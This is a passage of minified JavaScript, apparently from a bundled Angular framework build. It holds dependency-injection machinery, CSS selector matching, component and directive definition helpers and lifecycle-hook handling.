Wu(t,e){return`${`NG0${Math.abs(t)}`}${e?": "+e:""}`}function eo(t){return{toString:t}.toString()}var Ys="__parameters__";function SD(t){return function(...n){if(t){let r=t(...n);for(let i in r)this[i]=r[i]}}}function TD(t,e,n){return eo(()=>{let r=SD(e);function i(...o){if(this instanceof i)return r.apply(this,o),this;let s=new i(...o);return a.annotation=s,a;function a(c,l,u){let d=c.hasOwnProperty(Ys)?c[Ys]:Object.defineProperty(c,Ys,{value:[]})[Ys];for(;d.length<=u;)d.push(null);return(d[u]=d[u]||[]).push(s),c}}return n&&(i.prototype=Object.create(n.prototype)),i.prototype.ngMetadataName=t,i.annotationCls=i,i})}var iu=globalThis;function Z(t){for(let e in t)if(t[e]===Z)return e;throw Error("Could not find renamed property on target object.")}function AD(t,e){for(let n in e)e.hasOwnProperty(n)&&!t.hasOwnProperty(n)&&(t[n]=e[n])}function Te(t){if(typeof t=="string")return t;if(Array.isArray(t))return"["+t.map(Te).join(", ")+"]";if(t==null)return""+t;if(t.overriddenName)return`${t.overriddenName}`;if(t.name)return`${t.name}`;let e=t.toString();if(e==null)return""+e;let n=e.indexOf(`
`);return n===-1?e:e.substring(0,n)}function Vg(t,e){return t==null||t===""?e===null?"":e:e==null||e===""?t:t+" "+e}var MD=Z({__forward_ref__:Z});function un(t){return t.__forward_ref__=un,t.toString=function(){return Te(this())},t}function De(t){return Em(t)?t():t}function Em(t){return typeof t=="function"&&t.hasOwnProperty(MD)&&t.__forward_ref__===un}function E(t){return{token:t.token,providedIn:t.providedIn||null,factory:t.factory,value:void 0}}function Bn(t){return{providers:t.providers||[],imports:t.imports||[]}}function ba(t){return jg(t,Dm)||jg(t,bm)}function Cm(t){return ba(t)!==null}function jg(t,e){return t.hasOwnProperty(e)?t[e]:null}function ND(t){let e=t&&(t[Dm]||t[bm]);return e||null}function Ug(t){return t&&(t.hasOwnProperty(Bg)||t.hasOwnProperty(RD))?t[Bg]:null}var Dm=Z({\u0275prov:Z}),Bg=Z({\u0275inj:Z}),bm=Z({ngInjectableDef:Z}),RD=Z({ngInjectorDef:Z}),I=class{constructor(e,n){this._desc=e,this.ngMetadataName="InjectionToken",this.\u0275prov=void 0,typeof n=="number"?this.__NG_ELEMENT_ID__=n:n!==void 0&&(this.\u0275prov=E({token:this,providedIn:n.providedIn||"root",factory:n.factory}))}get multi(){return this}toString(){return`InjectionToken ${this._desc}`}};function Sm(t){return t&&!!t.\u0275providers}var xD=Z({\u0275cmp:Z}),OD=Z({\u0275dir:Z}),PD=Z({\u0275pipe:Z}),kD=Z({\u0275mod:Z}),ia=Z({\u0275fac:Z}),zi=Z({__NG_ELEMENT_ID__:Z}),$g=Z({__NG_ENV_ID__:Z});function FD(t){return typeof t=="string"?t:t==null?"":String(t)}function LD(t){return typeof t=="function"?t.name||t.toString():typeof t=="object"&&t!=null&&typeof t.type=="function"?t.type.name||t.type.toString():FD(t)}function VD(t,e){let n=e?`. Dependency path: ${e.join(" > ")} > ${t}`:"";throw new w(-200,t)}function zu(t,e){throw new w(-201,!1)}var M=function(t){return t[t.Default=0]="Default",t[t.Host=1]="Host",t[t.Self=2]="Self",t[t.SkipSelf=4]="SkipSelf",t[t.Optional=8]="Optional",t}(M||{}),ou;function Tm(){return ou}function je(t){let e=ou;return ou=t,e}function Am(t,e,n){let r=ba(t);if(r&&r.providedIn=="root")return r.value===void 0?r.value=r.factory():r.value;if(n&M.Optional)return null;if(e!==void 0)return e;zu(t,"Injector")}var jD={},Gi=jD,su="__NG_DI_FLAG__",oa="ngTempTokenPath",UD="ngTokenPath",BD=/\n/gm,$D="\u0275",Hg="__source",kr;function HD(){return kr}function rn(t){let e=kr;return kr=t,e}function WD(t,e=M.Default){if(kr===void 0)throw new w(-203,!1);return kr===null?Am(t,void 0,e):kr.get(t,e&M.Optional?null:void 0,e)}function N(t,e=M.Default){return(Tm()||WD)(De(t),e)}function y(t,e=M.Default){return N(t,Sa(e))}function Sa(t){return typeof t>"u"||typeof t=="number"?t:0|(t.optional&&8)|(t.host&&1)|(t.self&&2)|(t.skipSelf&&4)}function au(t){let e=[];for(let n=0;n<t.length;n++){let r=De(t[n]);if(Array.isArray(r)){if(r.length===0)throw new w(900,!1);let i,o=M.Default;for(let s=0;s<r.length;s++){let a=r[s],c=GD(a);typeof c=="number"?c===-1?i=a.token:o|=c:i=a}e.push(N(i,o))}else e.push(N(r))}return e}function zD(t,e){return t[su]=e,t.prototype[su]=e,t}function GD(t){return t[su]}function qD(t,e,n,r){let i=t[oa];throw e[Hg]&&i.unshift(e[Hg]),t.message=YD(`
`+t.message,i,n,r),t[UD]=i,t[oa]=null,t}function YD(t,e,n,r=null){t=t&&t.charAt(0)===`
`&&t.charAt(1)==$D?t.slice(2):t;let i=Te(e);if(Array.isArray(e))i=e.map(Te).join(" -> ");else if(typeof e=="object"){let o=[];for(let s in e)if(e.hasOwnProperty(s)){let a=e[s];o.push(s+":"+(typeof a=="string"?JSON.stringify(a):Te(a)))}i=`{${o.join(", ")}}`}return`${n}${r?"("+r+")":""}[${i}]: ${t.replace(BD,`
  `)}`}var Ne=zD(TD("Optional"),8);function Lr(t,e){let n=t.hasOwnProperty(ia);return n?t[ia]:null}function Gu(t,e){t.forEach(n=>Array.isArray(n)?Gu(n,e):e(n))}function Mm(t,e,n){e>=t.length?t.push(n):t.splice(e,0,n)}function sa(t,e){return e>=t.length-1?t.pop():t.splice(e,1)[0]}function KD(t,e,n,r){let i=t.length;if(i==e)t.push(n,r);else if(i===1)t.push(r,t[0]),t[0]=n;else{for(i--,t.push(t[i-1],t[i]);i>e;){let o=i-2;t[i]=t[o],i--}t[e]=n,t[e+1]=r}}function ZD(t,e,n){let r=to(t,e);return r>=0?t[r|1]=n:(r=~r,KD(t,r,e,n)),r}function zl(t,e){let n=to(t,e);if(n>=0)return t[n|1]}function to(t,e){return QD(t,e,1)}function QD(t,e,n){let r=0,i=t.length>>n;for(;i!==r;){let o=r+(i-r>>1),s=t[o<<n];if(e===s)return o<<n;s>e?i=o:r=o+1}return~(i<<n)}var Vr={},Ue=[],jr=new I(""),Nm=new I("",-1),Rm=new I(""),aa=class{get(e,n=Gi){if(n===Gi){let r=new Error(`NullInjectorError: No provider for ${Te(e)}!`);throw r.name="NullInjectorError",r}return n}},xm=function(t){return t[t.OnPush=0]="OnPush",t[t.Default=1]="Default",t}(xm||{}),ht=function(t){return t[t.Emulated=0]="Emulated",t[t.None=2]="None",t[t.ShadowDom=3]="ShadowDom",t}(ht||{}),an=function(t){return t[t.None=0]="None",t[t.SignalBased=1]="SignalBased",t[t.HasDecoratorInputTransform=2]="HasDecoratorInputTransform",t}(an||{});function JD(t,e,n){let r=t.length;for(;;){let i=t.indexOf(e,n);if(i===-1)return i;if(i===0||t.charCodeAt(i-1)<=32){let o=e.length;if(i+o===r||t.charCodeAt(i+o)<=32)return i}n=i+1}}function cu(t,e,n){let r=0;for(;r<n.length;){let i=n[r];if(typeof i=="number"){if(i!==0)break;r++;let o=n[r++],s=n[r++],a=n[r++];t.setAttribute(e,s,a,o)}else{let o=i,s=n[++r];eb(o)?t.setProperty(e,o,s):t.setAttribute(e,o,s),r++}}return r}function XD(t){return t===3||t===4||t===6}function eb(t){return t.charCodeAt(0)===64}function qi(t,e){if(!(e===null||e.length===0))if(t===null||t.length===0)t=e.slice();else{let n=-1;for(let r=0;r<e.length;r++){let i=e[r];typeof i=="number"?n=i:n===0||(n===-1||n===2?Wg(t,n,i,null,e[++r]):Wg(t,n,i,null,null))}}return t}function Wg(t,e,n,r,i){let o=0,s=t.length;if(e===-1)s=-1;else for(;o<t.length;){let a=t[o++];if(typeof a=="number"){if(a===e){s=-1;break}else if(a>e){s=o-1;break}}}for(;o<t.length;){let a=t[o];if(typeof a=="number")break;if(a===n){if(r===null){i!==null&&(t[o+1]=i);return}else if(r===t[o+1]){t[o+2]=i;return}}o++,r!==null&&o++,i!==null&&o++}s!==-1&&(t.splice(s,0,e),o=s+1),t.splice(o++,0,n),r!==null&&t.splice(o++,0,r),i!==null&&t.splice(o++,0,i)}var Om="ng-template";function tb(t,e,n,r){let i=0;if(r){for(;i<e.length&&typeof e[i]=="string";i+=2)if(e[i]==="class"&&JD(e[i+1].toLowerCase(),n,0)!==-1)return!0}else if(qu(t))return!1;if(i=e.indexOf(1,i),i>-1){let o;for(;++i<e.length&&typeof(o=e[i])=="string";)if(o.toLowerCase()===n)return!0}return!1}function qu(t){return t.type===4&&t.value!==Om}function nb(t,e,n){let r=t.type===4&&!n?Om:t.value;return e===r}function rb(t,e,n){let r=4,i=t.attrs,o=i!==null?sb(i):0,s=!1;for(let a=0;a<e.length;a++){let c=e[a];if(typeof c=="number"){if(!s&&!et(r)&&!et(c))return!1;if(s&&et(c))continue;s=!1,r=c|r&1;continue}if(!s)if(r&4){if(r=2|r&1,c!==""&&!nb(t,c,n)||c===""&&e.length===1){if(et(r))return!1;s=!0}}else if(r&8){if(i===null||!tb(t,i,c,n)){if(et(r))return!1;s=!0}}else{let l=e[++a],u=ib(c,i,qu(t),n);if(u===-1){if(et(r))return!1;s=!0;continue}if(l!==""){let d;if(u>o?d="":d=i[u+1].toLowerCase(),r&2&&l!==d){if(et(r))return!1;s=!0}}}}return et(r)||s}function et(t){return(t&1)===0}function ib(t,e,n,r){if(e===null)return-1;let i=0;if(r||!n){let o=!1;for(;i<e.length;){let s=e[i];if(s===t)return i;if(s===3||s===6)o=!0;else if(s===1||s===2){let a=e[++i];for(;typeof a=="string";)a=e[++i];continue}else{if(s===4)break;if(s===0){i+=4;continue}}i+=o?1:2}return-1}else return ab(e,t)}function ob(t,e,n=!1){for(let r=0;r<e.length;r++)if(rb(t,e[r],n))return!0;return!1}function sb(t){for(let e=0;e<t.length;e++){let n=t[e];if(XD(n))return e}return t.length}function ab(t,e){let n=t.indexOf(4);if(n>-1)for(n++;n<t.length;){let r=t[n];if(typeof r=="number")return-1;if(r===e)return n;n++}return-1}function zg(t,e){return t?":not("+e.trim()+")":e}function cb(t){let e=t[0],n=1,r=2,i="",o=!1;for(;n<t.length;){let s=t[n];if(typeof s=="string")if(r&2){let a=t[++n];i+="["+s+(a.length>0?'="'+a+'"':"")+"]"}else r&8?i+="."+s:r&4&&(i+=" "+s);else i!==""&&!et(s)&&(e+=zg(o,i),i=""),r=s,o=o||!et(r);n++}return i!==""&&(e+=zg(o,i)),e}function lb(t){return t.map(cb).join(",")}function ub(t){let e=[],n=[],r=1,i=2;for(;r<t.length;){let o=t[r];if(typeof o=="string")i===2?o!==""&&e.push(o,t[++r]):i===8&&n.push(o);else{if(!et(i))break;i=o}r++}return{attrs:e,classes:n}}function Kr(t){return eo(()=>{let e=Vm(t),n=x(v({},e),{decls:t.decls,vars:t.vars,template:t.template,consts:t.consts||null,ngContentSelectors:t.ngContentSelectors,onPush:t.changeDetection===xm.OnPush,directiveDefs:null,pipeDefs:null,dependencies:e.standalone&&t.dependencies||null,getStandaloneInjector:null,signals:t.signals??!1,data:t.data||{},encapsulation:t.encapsulation||ht.Emulated,styles:t.styles||Ue,_:null,schemas:t.schemas||null,tView:null,id:""});jm(n);let r=t.dependencies;return n.directiveDefs=qg(r,!1),n.pipeDefs=qg(r,!0),n.id=fb(n),n})}function db(t){return Pn(t)||Pm(t)}function hb(t){return t!==null}function $n(t){return eo(()=>({type:t.type,bootstrap:t.bootstrap||Ue,declarations:t.declarations||Ue,imports:t.imports||Ue,exports:t.exports||Ue,transitiveCompileScopes:null,schemas:t.schemas||null,id:t.id||null}))}function Gg(t,e){if(t==null)return Vr;let n={};for(let r in t)if(t.hasOwnProperty(r)){let i=t[r],o,s,a=an.None;Array.isArray(i)?(a=i[0],o=i[1],s=i[2]??o):(o=i,s=i),e?(n[o]=a!==an.None?[r,a]:r,e[o]=s):n[o]=r}return n}function Ie(t){return eo(()=>{let e=Vm(t);return jm(e),e})}function Pn(t){return t[xD]||null}function Pm(t){return t[OD]||null}function km(t){return t[PD]||null}function Fm(t){let e=Pn(t)||Pm(t)||km(t);return e!==null?e.standalone:!1}function Lm(t,e){let n=t[kD]||null;if(!n&&e===!0)throw new Error(`Type ${Te(t)} does not have '\u0275mod' property.`);return n}function Vm(t){let e={};return{type:t.type,providersResolver:null,factory:null,hostBindings:t.hostBindings||null,hostVars:t.hostVars||0,hostAttrs:t.hostAttrs||null,contentQueries:t.contentQueries||null,declaredInputs:e,inputTransforms:null,inputConfig:t.inputs||Vr,exportAs:t.exportAs||null,standalone:t.standalone===!0,signals:t.signals===!0,selectors:t.selectors||Ue,viewQuery:t.viewQuery||null,features:t.features||null,setInput:null,findHostDirectiveDefs:null,hostDirectives:null,inputs:Gg(t.inputs,e),outputs:Gg(t.outputs),debugInfo:null}}function jm(t){t.features?.forEach(e=>e(t))}function qg(t,e){if(!t)return null;let n=e?km:db;return()=>(typeof t=="function"?t():t).map(r=>n(r)).filter(hb)}function fb(t){let e=0,n=[t.selectors,t.ngContentSelectors,t.hostVars,t.hostAttrs,t.consts,t.vars,t.decls,t.encapsulation,t.standalone,t.signals,t.exportAs,JSON.stringify(t.inputs),JSON.stringify(t.outputs),Object.getOwnPropertyNames(t.type.prototype),!!t.contentQueries,!!t.viewQuery].join("|");for(let i of n)e=Math.imul(31,e)+i.charCodeAt(0)<<0;return e+=2147483648,"c"+e}function gt(t){return{\u0275providers:t}}function Yu(...t){return{\u0275providers:Um(!0,t),\u0275fromNgModule:!0}}function Um(t,...e){let n=[],r=new Set,i,o=s=>{n.push(s)};return Gu(e,s=>{let a=s;lu(a,o,[],r)&&(i||=[],i.push(a))}),i!==void 0&&Bm(i,o),n}function Bm(t,e){for(let n=0;n<t.length;n++){let{ngModule:r,providers:i}=t[n];Ku(i,o=>{e(o,r)})}}function lu(t,e,n,r){if(t=De(t),!t)return!1;let i=null,o=Ug(t),s=!o&&Pn(t);if(!o&&!s){let c=t.ngModule;if(o=Ug(c),o)i=c;else return!1}else{if(s&&!s.standalone)return!1;i=t}let a=r.has(i);if(s){if(a)return!1;if(r.add(i),s.dependencies){let c=typeof s.dependencies=="function"?s.dependencies():s.dependencies;for(let l of c)lu(l,e,n,r)}}else if(o){if(o.imports!=null&&!a){r.add(i);let l;try{Gu(o.imports,u=>{lu(u,e,n,r)&&(l||=[],l.push(u))})}finally{}l!==void 0&&Bm(l,e)}if(!a){let l=Lr(i)||(()=>new i);e({provide:i,useFactory:l,deps:Ue},i),e({provide:Rm,useValue:i,multi:!0},i),e({provide:jr,useValue:()=>N(i),multi:!0},i)}let c=o.providers;if(c!=null&&!a){let l=t;Ku(c,u=>{e(u,l)})}}else return!1;return i!==t&&t.providers!==void 0}function Ku(t,e){for(let n of t)Sm(n)&&(n=n.\u0275providers),Array.isArray(n)?Ku(n,e):e(n)}var pb=Z({provide:String,useValue:Z});function $m(t){return t!==null&&typeof t=="object"&&pb in t}function gb(t){return!!(t&&t.useExisting)}function mb(t){return!!(t&&t.useFactory)}function Ur(t){return typeof t=="function"}function vb(t){return!!t.useClass}var Ta=new I(""),Xs={},yb={},Gl;function Zu(){return Gl===void 0&&(Gl=new aa),Gl}var He=class{},Yi=class extends He{get destroyed(){return this._destroyed}constructor(e,n,r,i){super(),this.parent=n,this.source=r,this.scopes=i,this.records=new Map,this._ngOnDestroyHooks=new Set,this._onDestroyHooks=[],this._destroyed=!1,du(e,s=>this.processProvider(s)),this.records.set(Nm,xr(void 0,this)),i.has("environment")&&this.records.set(He,xr(void 0,this));let o=this.records.get(Ta);o!=null&&typeof o.value=="string"&&this.scopes.add(o.value),this.injectorDefTypes=new Set(this.get(Rm,Ue,M.Self))}destroy(){this.assertNotDestroyed(),this._destroyed=!0;let e=H(null);try{for(let r of this._ngOnDestroyHooks)r.ngOnDestroy();let n=this._onDestroyHooks;this._onDestroyHooks=[];for(let r of n)r()}finally{this.records.clear(),this._ngOnDestroyHooks.clear(),this.injectorDefTypes.clear(),H(e)}}onDestroy(e){return this.assertNotDestroyed(),this._onDestroyHooks.push(e),()=>this.removeOnDestroy(e)}runInContext(e){this.assertNotDestroyed();let n=rn(this),r=je(void 0),i;try{return e()}finally{rn(n),je(r)}}get(e,n=Gi,r=M.Default){if(this.assertNotDestroyed(),e.hasOwnProperty($g))return e[$g](this);r=Sa(r);let i,o=rn(this),s=je(void 0);try{if(!(r&M.SkipSelf)){let c=this.records.get(e);if(c===void 0){let l=Cb(e)&&ba(e);l&&this.injectableDefInScope(l)?c=xr(uu(e),Xs):c=null,this.records.set(e,c)}if(c!=null)return this.hydrate(e,c)}let a=r&M.Self?Zu():this.parent;return n=r&M.Optional&&n===Gi?null:n,a.get(e,n)}catch(a){if(a.name==="NullInjectorError"){if((a[oa]=a[oa]||[]).unshift(Te(e)),o)throw a;return qD(a,e,"R3InjectorError",this.source)}else throw a}finally{je(s),rn(o)}}resolveInjectorInitializers(){let e=H(null),n=rn(this),r=je(void 0),i;try{let o=this.get(jr,Ue,M.Self);for(let s of o)s()}finally{rn(n),je(r),H(e)}}toString(){let e=[],n=this.records;for(let r of n.keys())e.push(Te(r));return`R3Injector[${e.join(", ")}]`}assertNotDestroyed(){if(this._destroyed)throw new w(205,!1)}processProvider(e){e=De(e);let n=Ur(e)?e:De(e&&e.provide),r=Ib(e);if(!Ur(e)&&e.multi===!0){let i=this.records.get(n);i||(i=xr(void 0,Xs,!0),i.factory=()=>au(i.multi),this.records.set(n,i)),n=e,i.multi.push(e)}this.records.set(n,r)}hydrate(e,n){let r=H(null);try{return n.value===Xs&&(n.value=yb,n.value=n.factory()),typeof n.value=="object"&&n.value&&Eb(n.value)&&this._ngOnDestroyHooks.add(n.value),n.value}finally{H(r)}}injectableDefInScope(e){if(!e.providedIn)return!1;let n=De(e.providedIn);return typeof n=="string"?n==="any"||this.scopes.has(n):this.injectorDefTypes.has(n)}removeOnDestroy(e){let n=this._onDestroyHooks.indexOf(e);n!==-1&&this._onDestroyHooks.splice(n,1)}};function uu(t){let e=ba(t),n=e!==null?e.factory:Lr(t);if(n!==null)return n;if(t instanceof I)throw new w(204,!1);if(t instanceof Function)return _b(t);throw new w(204,!1)}function _b(t){if(t.length>0)throw new w(204,!1);let n=ND(t);return n!==null?()=>n.factory(t):()=>new t}function Ib(t){if($m(t))return xr(void 0,t.useValue);{let e=Hm(t);return xr(e,Xs)}}function Hm(t,e,n){let r;if(Ur(t)){let i=De(t);return Lr(i)||uu(i)}else if($m(t))r=()=>De(t.useValue);else if(mb(t))r=()=>t.useFactory(...au(t.deps||[]));else if(gb(t))r=()=>N(De(t.useExisting));else{let i=De(t&&(t.useClass||t.provide));if(wb(t))r=()=>new i(...au(t.deps));else return Lr(i)||uu(i)}return r}function xr(t,e,n=!1){return{factory:t,value:e,multi:n?[]:void 0}}function wb(t){return!!t.deps}function Eb(t){return t!==null&&typeof t=="object"&&typeof t.ngOnDestroy=="function"}function Cb(t){return typeof t=="function"||typeof t=="object"&&t instanceof I}function du(t,e){for(let n of t)Array.isArray(n)?du(n,e):n&&Sm(n)?du(n.\u0275providers,e):e(n)}function Rt(t,e){t instanceof Yi&&t.assertNotDestroyed();let n,r=rn(t),i=je(void 0);try{return e()}finally{rn(r),je(i)}}function Db(){return Tm()!==void 0||HD()!=null}function bb(t){return typeof t=="function"}var xt=0,k=1,b=2,be=3,tt=4,nt=5,ca=6,la=7,St=8,Br=9,Tt=10,Ae=11,Ki=12,Yg=13,no=14,ft=15,Zi=16,Or=17,Aa=18,Ma=19,Wm=20,on=21,ql=22,Be=23,kn=25,zm=1;var Fn=7,ua=8,da=9,$e=10,ha=function(t){return t[t.None=0]="None",t[t.HasTransplantedViews=2]="HasTransplantedViews",t}(ha||{});function sn(t){return Array.isArray(t)&&typeof t[zm]=="object"}function Ot(t){return Array.isArray(t)&&t[zm]===!0}function Gm(t){return(t.flags&4)!==0}function Na(t){return t.componentOffset>-1}function qm(t){return(t.flags&1)===1}function cn(t){return!!t.template}function hu(t){return(t[b]&512)!==0}var fu=class{constructor(e,n,r){this.previousValue=e,this.currentValue=n,this.firstChange=r}isFirstChange(){return this.firstChange}};function Ym(t,e,n,r){e!==null?e.applyValueToInputSignal(e,r):t[n]=r}function Hn(){return Km}function Km(t){return t.type.prototype.ngOnChanges&&(t.setInput=Tb),Sb}Hn.ngInherit=!0;function Sb(){let t=Qm(this),e=t?.current;if(e){let n=t.previous;if(n===Vr)t.previous=e;else for(let r in e)n[r]=e[r];t.current=null,this.ngOnChanges(e)}}function Tb(t,e,n,r,i){let o=this.declaredInputs[r],s=Qm(t)||Ab(t,{previous:Vr,current:null}),a=s.current||(s.current={}),c=s.previous,l=c[o];a[o]=new fu(l&&l.currentValue,n,c===Vr),Ym(t,e,i,n)}var Zm="__ngSimpleChanges__";function Qm(t){return t[Zm]||null}function Ab(t,e){return t[Zm]=e}var Kg=null;var ut=function(t,e,n){Kg?.(t,e,n)},Mb="svg",Nb="math";function pt(t){for(;Array.isArray(t);)t=t[xt];return t}function Rb(t,e){return pt(e[t])}function rt(t,e){return pt(e[t.index])}function Jm(t,e){return t.data[e]}function dn(t,e){let n=e[t];return sn(n)?n:n[xt]}function Qu(t){return(t[b]&128)===128}function xb(t){return Ot(t[be])}function Zg(t,e){return e==null?null:t[e]}function Xm(t){t[Or]=0}function ev(t){t[b]&1024||(t[b]|=1024,Qu(t)&&xa(t))}function Ra(t){return!!(t[b]&9216||t[Be]?.dirty)}function pu(t){t[Tt].changeDetectionScheduler?.notify(8),t[b]&64&&(t[b]|=1024),Ra(t)&&xa(t)}function xa(t){t[Tt].changeDetectionScheduler?.notify(0);let e=Ln(t);for(;e!==null&&!(e[b]&8192||(e[b]|=8192,!Qu(e)));)e=Ln(e)}function tv(t,e){if((t[b]&256)===256)throw new w(911,!1);t[on]===null&&(t[on]=[]),t[on].push(e)}function Ob(t,e){if(t[on]===null)return;let n=t[on].indexOf(e);n!==-1&&t[on].splice(n,1)}function Ln(t){let e=t[be];return Ot(e)?e[be]:e}var $={lFrame:uv(null),bindingsEnabled:!0,skipHydrationRootTNode:null};var nv=!1;function Pb(){return $.lFrame.elementDepthCount}function kb(){$.lFrame.elementDepthCount++}function Fb(){$.lFrame.elementDepthCount--}function rv(){return $.bindingsEnabled}function Lb(){return $.skipHydrationRootTNode!==null}function Vb(t){return $.skipHydrationRootTNode===t}function jb(){$.skipHydrationRootTNode=null}function me(){return $.lFrame.lView}function Pt(){return $.lFrame.tView}function We(){let t=iv();for(;t!==null&&t.type===64;)t=t.parent;return t}function iv(){return $.lFrame.currentTNode}function Ub(){let t=$.lFrame,e=t.currentTNode;return t.isParent?e:e.parent}function Oa(t,e){let n=$.lFrame;n.currentTNode=t,n.isParent=e}function ov(){return $.lFrame.isParent}function Bb(){$.lFrame.isParent=!1}function sv(){return nv}function Qg(t){nv=t}function $b(t){return $.lFrame.bindingIndex=t}function Hb(){return $.lFrame.bindingIndex++}function Wb(t){let e=$.lFrame,n=e.bindingIndex;return e.bindingIndex=e.bindingIndex+t,n}function zb(){return $.lFrame.inI18n}function Gb(t,e){let n=$.lFrame;n.bindingIndex=n.bindingRootIndex=t,gu(e)}function qb(){return $.lFrame.currentDirectiveIndex}function gu(t){$.lFrame.currentDirectiveIndex=t}function Yb(t){let e=$.lFrame.currentDirectiveIndex;return e===-1?null:t[e]}function av(t){$.lFrame.currentQueryIndex=t}function Kb(t){let e=t[k];return e.type===2?e.declTNode:e.type===1?t[nt]:null}function cv(t,e,n){if(n&M.SkipSelf){let i=e,o=t;for(;i=i.parent,i===null&&!(n&M.Host);)if(i=Kb(o),i===null||(o=o[no],i.type&10))break;if(i===null)return!1;e=i,t=o}let r=$.lFrame=lv();return r.currentTNode=e,r.lView=t,!0}function Ju(t){let e=lv(),n=t[k];$.lFrame=e,e.currentTNode=n.firstChild,e.lView=t,e.tView=n,e.contextLView=t,e.bindingIndex=n.bindingStartIndex,e.inI18n=!1}function lv(){let t=$.lFrame,e=t===null?null:t.child;return e===null?uv(t):e}function uv(t){let e={currentTNode:null,isParent:!0,lView:null,tView:null,selectedIndex:-1,contextLView:null,elementDepthCount:0,currentNamespace:null,currentDirectiveIndex:-1,bindingRootIndex:-1,bindingIndex:-1,currentQueryIndex:0,parent:t,child:null,inI18n:!1};return t!==null&&(t.child=e),e}function dv(){let t=$.lFrame;return $.lFrame=t.parent,t.currentTNode=null,t.lView=null,t}var hv=dv;function Xu(){let t=dv();t.isParent=!0,t.tView=null,t.selectedIndex=-1,t.contextLView=null,t.elementDepthCount=0,t.currentDirectiveIndex=-1,t.currentNamespace=null,t.bindingRootIndex=-1,t.bindingIndex=-1,t.currentQueryIndex=0}function ro(){return $.lFrame.selectedIndex}function Vn(t){$.lFrame.selectedIndex=t}function Zb(){let t=$.lFrame;return Jm(t.tView,t.selectedIndex)}function Qb(){return $.lFrame.currentNamespace}var fv=!0;function pv(){return fv}function gv(t){fv=t}function Jb(t,e,n){let{ngOnChanges:r,ngOnInit:i,ngDoCheck:o}=e.type.prototype;if(r){let s=Km(e);(n.preOrderHooks??=[]).push(t,s),(n.preOrderCheckHooks??=[]).push(t,s)}i&&(n.preOrderHooks??=[]).push(0-t,i),o&&((n.preOrderHooks??=[]).push(t,o),(n.preOrderCheckHooks??=[]).push(t,o))}function mv(t,e){for(let n=e.directiveStart,r=e.directiveEnd;n<r;n++){let o=t.data[n].type.prototype,{ngAfterContentInit:s,ngAfterContentChecked:a,ngAfterViewInit:c,ngAfterViewChecked:l,ngOnDestroy:u}=o;s&&(t.contentHooks??=[]).push(-n,s),a&&((t.contentHooks??=[]).push(n,a),(t.contentCheckHooks??=[]).push(n,a)),c&&(t.viewHooks??=[]).push(-n,c),l&&((t.viewHooks??=[]).push(n,l),(t.viewCheckHooks??=[]).push(n,l)),u!=null&&(t.destroyHooks??=[]).push(n,u)}}function ea(t,e,n){vv(t,e,3,n)}function ta(t,e,n,r){(t[b]&3)===n&&vv(t,e,n,r)}function Yl(t,e){let n=t[b];(n&3)===e&&(n&=16383,n+=1,t[b]=n)}function vv(t,e,n,r){let i=r!==void 0?t[Or]&65535:0,o=r??-1,s=e.length-1,a=0;for(let c=i;c<s;c++)if(typeof e[c+1]=="number"){if(a=e[c],r!=null&&a>=r)break}else e[c]<0&&(t[Or]+=65536),(a<o||o==-1)&&(Xb(t,n,e,c),t[Or]=(t[Or]&4294901760)+c+2),c++}function Jg(t,e){ut(4,t,e);let n=H(null);try{e.call(t)}finally{H(n),ut(5,t,e)}}function Xb(t,e,n,r){let i=n[r]<0,o=n[r+1],s=i?-n[r]:n[r],a=t[s];i?t[b]>>14<t[Or]>>16&&(t[b]&3)===e&&(t[b]+=16384,Jg(a,o)):Jg(a,o)}var Fr=-1,jn=class{constructor(e,n,r){this.factory=e,this.resolving=!1,this.canSeeViewProviders=n,this.injectImpl=r}};function eS(t){return t instanceof jn}function tS(t){return(t.flags&8)!==0}function nS(t){return(t.flags&16)!==0}var Kl={},mu=class{constructor(e,n){this.injector=e,this.parentInjector=n}get(e,n,r){r=Sa(r);let i=this.injector.get(e,Kl,r);return i!==Kl||n===Kl?i:this.parentInjector.get(e,n,r)}};function yv(t){return t!==Fr}function fa(t){return t&32767}function rS(t){return t>>16}function pa(t,e){let n=rS(t),r=e;for(;n>0;)r=r[no],n--;return r}var vu=!0;function Xg(t){let e=vu;return vu=t,e}var iS=256,_v=iS-1,Iv=5,oS=0,dt={};function sS(t,e,n){let r;typeof n=="string"?r=n.charCodeAt(0)||0:n.hasOwnProperty(zi)&&(r=n[zi]),r==null&&(r=n[zi]=oS++);let i=r&_v,o=1<<i;e.data[t+(i>>Iv)]|=o}function ga(t,e){let n=wv(t,e);if(n!==-1)return n;let r=e[k];r.firstCreatePass&&(t.injectorIndex=e.length,Zl(r.data,t),Zl(e,null),Zl(r.blueprint,null));let i=ed(t,e),o=t.injectorIndex;if(yv(i)){let s=fa(i),a=pa(i,e),c=a[k].data;for(let l=0;l<8;l++)e[o+l]=a[s+l]|c[s+l]}return e[o+8]=i,o}function Zl(t,e){t.push(0,0,0,0,0,0,0,0,e)}function wv(t,e){return t.injectorIndex===-1||t.parent&&t.parent.injectorIndex===t.injectorIndex||e[t.injectorIndex+8]===null?-1:t.injectorIndex}function ed(t,e){if(t.parent&&t.parent.injectorIndex!==-1)return t.parent.injectorIndex;let n=0,r=null,i=e;for(;i!==null;){if(r=Sv(i),r===null)return Fr;if(n++,i=i[no],r.injectorIndex!==-1)return r.injectorIndex|n<<16}return Fr}function yu(t,e,n){sS(t,e,n)}function Ev(t,e,n){if(n&M.Optional||t!==void 0)return t;zu(e,"NodeInjector")}function Cv(t,e,n,r){if(n&M.Optional&&r===void 0&&(r=null),!(n&(M.Self|M.Host))){let i=t[Br],o=je(void 0);try{return i?i.get(e,r,n&M.Optional):Am(e,r,n&M.Optional)}finally{je(o)}}return Ev(r,e,n)}function Dv(t,e,n,r=M.Default,i){if(t!==null){if(e[b]&2048&&!(r&M.Self)){let s=dS(t,e,n,r,dt);if(s!==dt)return s}let o=bv(t,e,n,r,dt);if(o!==dt)return o}return Cv(e,n,r,i)}function bv(t,e,n,r,i){let o=lS(n);if(typeof o=="function"){if(!cv(e,t,r))return r&M.Host?Ev(i,n,r):Cv(e,n,r,i);try{let s;if(s=o(r),s==null&&!(r&M.Optional))zu(n);else return s}finally{hv()}}else if(typeof o=="number"){let s=null,a=wv(t,e),c=Fr,l=r&M.Host?e[ft][nt]:null;for((a===-1||r&M.SkipSelf)&&(c=a===-1?ed(t,e):e[a+8],c===Fr||!tm(r,!1)?a=-1:(s=e[k],a=fa(c),e=pa(c,e)));a!==-1;){let u=e[k];if(em(o,a,u.data)){let d=aS(a,e,n,s,r,l);if(d!==dt)return 